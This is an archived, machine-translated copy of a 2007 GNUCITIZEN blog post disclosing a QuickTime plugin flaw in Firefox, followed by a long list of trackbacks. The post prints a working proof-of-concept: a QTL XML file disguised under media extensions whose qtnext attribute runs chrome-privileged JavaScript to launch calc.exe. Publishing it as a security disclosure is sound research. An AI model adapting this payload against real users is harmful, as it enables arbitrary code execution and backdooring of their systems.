---
type: Article
title: "0DAY: QuickTime pwns Firefox"
resource: "https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/"
tags: [article, webseclist-reference, en-US, gnucitizen-org]
generated:
  by: webseclist-refs/1
  at: "2026-08-09T04:42:53+00:00"
status: deprecated
stale_after: 2027-08-09
sources:
  - id: original
    resource: "https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/"
    title: "0DAY: QuickTime pwns Firefox"
  - id: capture
    resource: "https://web.archive.org/web/20071214054935/https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/"
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2007.md:89"
commit: ""
content_sha256: f94b8207f66fa8558c9734ddc20896e8223e1c2f8e3cf9f3f03285dab5598450
depth: full
depth_reason: default
kind: article
language: en-US
licence: unknown
original_url: "https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/"
published: ""
publisher: gnucitizen.org
publisher_english: ""
raw_sha256: 518be1122faa68b82244065c2886309c2025fee45b47cfb8fe221048e371a1a6
retrieved_from: "https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/"
retrieved_kind: stored
retrieved_utc: "2026-08-09T04:42:53+00:00"
slug: gnucitizen-org-0day-quicktime-pwns-firefox_translate
snapshot: 20071214054935
title_english: ""
translation_file: ""
translation_of: gnucitizen-org-0day-quicktime-pwns-firefox.md
---

# 0DAY: QuickTime pwns Firefox (English translation)

**0DAY: QuickTime pwns Firefox** - Author not stated, gnucitizen.org.

- Published: date not stated
- Original: <https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/>
- Preserved from: https://www.gnucitizen.org/projects/0day-quicktime-pwns-firefox/ (stored) on 2026-08-09
- Capture timestamp: 20071214054935
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content (translated into English)

_Machine translation of [`gnucitizen-org-0day-quicktime-pwns-firefox.md`](gnucitizen-org-0day-quicktime-pwns-firefox.md), which holds the source's own words. Code, payloads, type names, URLs and CVE identifiers were masked before translating and restored after, so they are byte-identical to the original._

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.


0DAY: QuickTime pwns Firefox | GNUCITIZEN

## 0DAY: QuickTime pwns Firefox

published: September 12th, 2007

It seams that QuickTime media formats can hack into Firefox. The result of this vulnerability can lead to full compromise of the browser and maybe even the underlaying operating system. **Don’t try this at home**.

![300 movie trailer](http://www.gnucitizen.org/images/378664681_f0ea7b3b94.jpg)

Before we move on, I have to say a few things. Last year I disclosed two highly critical QuickTime vulnerabilities [here](http://www.gnucitizen.org/blog/backdooring-quicktime-movies/) and [here](http://www.gnucitizen.org/blog/backdooring-mp3-files/). The first vulnerability was fixed but the second one was completely ignored. I tried to bring the spot light on the second vulnerability one more time over [here](http://www.gnucitizen.org/blog/myspace-quicktime-worm-follow-up), yet nobody listened. So, I decided to post a demonstration of how a *Low risk* issue can be turned into a very easy to perform **HIGH risk** attack.

The exploit is rather simple. But first, here is a simple QTL file which instructs the browser to display a friendly `alert('whats up...')` message on the screen:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('whats up...')"/>
```

The most interesting thing about this simple XML file is that we can save it with QuickTime supported extension in order to mislead the user. If you check [about:plugins](about:plugins) you will see that QuickTime supports several media formats. We can use the audio and video formats only. This means that you can paste the above code into files with extensions: **3g2, 3gp, 3gp2, 3gpp, AMR, aac, adts, aif, aifc, aiff, amc, au, avi, bwf, caf, cdda, cel, flc, fli, gsm, m15, m1a, m1s, m1v, m2a, m4a, m4b, m4p, m4v, m75, mac, mov, mp2, mp3, mp4, mpa, mpeg, mpg, mpm, mpv, mqv, pct, pic, pict, png, pnt, pntg, qcp, qt, qti, qtif, rgb, rts, rtsp, sdp, sdv, sgi, snd, ulw, vfw, wav** and others.

Enough theory, show me some action. The exploit that gains chrome privileges looks like this:

```
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="a.mp3" autoplay="true" qtnext="-chrome javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);"/>
```

In practice I can do anything with the browser, like installing browser backdoors, and the operating system if the victim is running with administrative privileges. However, just for the sake of this demonstration, I simply open **calc.exe**. Keep in mind that the exploit is **cross-platformed**.

If you dare to try this in your browser, here is a list of a few files you have to click on. They are not malicious. You have my word.

*BTW, QuickTime comes by default with iTunes. Therefore, iTunes users are most affected*.

[» comments rss](http://www.gnucitizen.org/blog/0day-quicktime-pwns-firefox/feed) | posted by [» pdp](http://www.gnucitizen.org/about/pdp)

## comments

## trackbacks

- [Severe QuickTime vulnerability in Firefox disclosed: Mozilla Links](http://mozillalinks.org/wp/2007/09/severe-vulnerability-in-quicktime-plugin-for-firefox-disclosed/)
- [hackademix.net » -82DAY: NoScript pwns QuickTime, pwning Firefox](http://hackademix.net/2007/09/12/noscript-pwns-quicktime-pwning-firefox/)
- [Ryan Naraine’s Zero Day mobile edition](http://blogs.zdnet.com/security/?p=509)
- [Firefox + QuickTime == Security hole @ another blog](http://obm.corcoles.net/20070912/firefoxquicktime-agujero-de-seguridad/)
- [Ferrgle Security Blog » Blog Archive » QuickTime combines with Firefox vulnerability](http://ferrgle.co.uk/?p=27)
- [QuickTime vulnerability in Firefox–webmeba.com](http://webmeba.com/quicktime-vulnerability-in-firefox/)
- [Mozilla Security Blog » Blog Archives » QuickTime to Firefox issue](http://blog.mozilla.com/security/2007/09/12/quicktime-to-firefox-issue/)
- [Code execution via Firefox and the QuickTime plugin](http://www.infospyware.eu/ejecucion-de-codigo-via-firefox-y-quiktime-plugin.html)
- [CHIP Online 0-security-blog » Blog Archive » QuickTime cracks Firefox](http://blog.chip.de/0-security-blog/quicktime-knackt-firefox-20070913/)
- [Technology News, Including Virtualization, 1GB Memory Mouse, Lenovo, Vista SP1](http://www.tipsdr.com/?p=1073)
- [QuickTime bug dangerous for Firefox users «](http://removestringfromobject.wordpress.com/2007/09/13/quicktime-bug-dangerous-for-firefox-users/)
- [QuickTime causes a security hole in Mozilla Firefox - Developer's Guide](http://www.developers-guide.net/forums/6039,quicktime-verursacht-sicherheitsloch-mozillas-firefox#post55400)
- [Tracelight.ch - A trail on the Internet » Blog Archive » Control over Firefox with QuickTime](http://www.tracelight.ch/2007/09/13/kontrolle-uber-firefox-mit-quicktime/)
- [QuickTime combined with Firefox explodes: exploit danger: ÐÊ£F‡Ñ§ (Guido Arata)](http://www.delfinsblog.it/uncategorized/quicktime-unito-a-firefox-fa-il-botto-pericolo-exploit/)
- [QuickTime and Firefox vulnerability - Spyware Sucks](http://msmvps.com/blogs/spywaresucks/archive/2007/09/14/1193403.aspx)
- [Old QuickTime bug compromises Firefox today | LKernelPanic](http://util-pc.com/lkernelpanic/?p=61)
- [QuickTime plugin allows JavaScript execution | Security Hub](http://blog.pedroaugusto.eti.br/2007/09/14/quicktime-permite-execucao-de-javascript-no-firefox/)
- [QuickTime opens a security hole in Firefox - TP Hilfe Forum](http://www.traum-projekt.com/forum/20-traum-news/102543-quicktime-reisst-sicherheitsleck-in-firefox.html#post797762)
- [QuickTime makes Firefox insecure - Mindfactory AG Community Forum](http://forum.mindfactory.de/browser/25734-quicktime-macht-firefox-unsicher.html#post387404)
- [About Firefox in Ukrainian » Blog Archive » Vulnerability in the QuickTime module](http://firefox.org.ua/all/qt-vulnerability/)
- [·¨-=[WHK]=-¨· » Archive » Apple QuickTime zero-day allows remote code execution through “qtl” files](http://whk.sitehacking.net/?p=60)
- [QuickTime vulnerability, Apple’s media player](http://www.towerlight2002.net/2007/09/15/vulnerabilita-quicktime-apples-media-player/)
- [Firefox / Internet Explorer QuickTime bug | 13337](http://www.13337.org/firefox-internet-explorer-quicktime-bug/)
- [Severe vulnerability in the QuickTime plug-in for Firefox on Windows | MakeAndInstall](http://www.makeandinstall.com/index.php/2007/09/16/grave-vulnerabilidad-en-el-plugin-quicktime-para-firefox-en-windows/)
- [-=[EdadFutura]=- v.6.0 - PETA » Vulnerability in QuickTime Player allows code execution through Firefox](http://www.edadfutura.com/2007/vulnerabilidad-en-quicktime-player-permite-ejecucion-de-codigo-a-traves-de-firefox/)
- [Firefox QuickTime plugin vulnerability](http://www.securitylabs.gr/blogs/2007/09/17/firefox-quicktime-plugin-vulnerability/)
- [WordPress exploit » mortal sin](http://mortal-sin.com/2007/09/18/wordpress-exploit/)
- [Firefox 2.0.0.7 - QuickTime vulnerability squashed - CyberNet News](http://cybernetnews.com/2007/09/18/firefox-2007-quicktime-vulnerability-squashed/)
- [Info World » Blog Archive » Mozilla fixes QuickTime flaw in Firefox](http://infoworld.bareinfo.com/archives/416)
- [Firefox](http://mashable.com/2007/09/18/firefox/)
- [Firefox 2.0.0.7 is live; eliminates QuickTime security flaw « ShortNet](http://shortnet.wordpress.com/2007/09/19/firefox-2007-is-live-eliminates-quicktime-security-flaw/)
- [2.0.0.7: QuickTime patch for Firefox - Mac World](http://www.macdunyasi.com/2007/09/19/2007-firefoxa-quicktime-yamasi/)
- [Firefox 2.0.0.7 · Style Grind](http://stylegrind.com/firefox/firefox-2007/)
- [Tech News » Firefox 2.0.0.7](http://techspecs.efx2blogs.com/2007/09/19/firefox-2007/)
- [diskostu says… Firefox 2.0.0.7 is out](http://www.diskostu.de/weblog/2007/09/18/firefox-2007-ist-raus/)
- [Second Life Loser » Blog Archive » Firefox 2.0.0.7 is live; eliminates QuickTime security flaw](http://www.secondlifeloser.com/firefox-2007-is-live-eliminates-quicktime-security-flaw-2/)
- [The Web Guy » Blog Archive » Firefox 2.0.0.7 eliminates QuickTime security flaw](http://www.intelliot.com/tech/2007/09/19/firefox-2007-eliminates-quicktime-security-flaw.html)
- [Firefox security update 2.0.0.7](http://malwareremoval.com/wp/updates/132/firefox-security-update-2007/)
- [Larholm.com - Me, myself and I » QuickTime qtnext zero-day for IE](http://larholm.com/2007/09/19/quicktime-qtnext-0day-for-ie/)
- [Firefox patches elusive QuickTime security flaw | Computer Solution](http://www.computer-solution.info/info/firefox-patches-elusive-quicktime-security-flaw.html)
- [tim ferro » Blog Archive » Firefox 2.0.0.7](http://www.sethkress.com/timferro/wordpress/archives/64)
- [hackademix.net » Don't open that doc!](http://hackademix.net/2007/09/20/dont-open-that-doc/)
- [Update: Firefox 2.0.0.7 * Quands.cat](http://www.quands.cat/wp/2007/09/21/actualitzacio-firefox-2007/)
- [New fixes for Firefox | Networking - networks, ADSL, VoIP, wireless, firewalling](http://www.networkingblog.it/index.php/2007/09/25/nuovi-fix-per-firefox-2/)
- [Pwet Pwet ^o^ » Blog Archive » Miscellaneous - #2](http://opensecunix.net/pwwwet/2007/09/26/en-vrac-2/)
- [T e c h n o L o g i c » 2.0.0.7: QuickTime patch for Firefox](http://www.techno-logic.tv/2007/09/19/2007-firefox%e2%80%99a-quicktime-yamasi/)
- [Apple fixes QuickTime flaw on Windows Vista, XP - VISTA.BLORGE.com](http://vista.blorge.com/2007/10/04/apple-fixes-quicktime-flaw-on-windows-vista-xp/)
- [Two updates + two unpatched vulnerabilities - TrendLabs | Malware Blog - by Trend Micro](http://blog.trendmicro.com/two-updates-2b-two-unpatched-vulnerabilities/)
- [electrobrain » Blog Archive » Vulnerability in the ‘QuickTime plug-in’](http://electrobrain.de/2007/10/04/schwachstelle-im-quicktime-plugin-2/)
- [More on the URI protocol handling flaw (WinXP + IE7) « Visible Procrastinations](http://visibleprocrastinations.wordpress.com/2007/10/12/more-on-the-uri-protocol-handing-flaw-winxpie7/)
- [Firefox 2.0.0.7 QuickTime-related issue | Slaptijack](http://slaptijack.com/software/firefox-2007-quicktime-related-issue/)
- [Alanat News » Unpatched QuickTime bug threatens Firefox](http://www.alanat.com/computers/unpatched-quicktime-bug-threatens-firefox/)
- [Tech News » Blog Archive » Firefox update patches QuickTime flaw](http://technology.ikazoku.com/1969/12/31/firefox-update-patches-quicktime-flaw/)

## respond

 name: (required)

 mail: (required)

 website:

 comment:
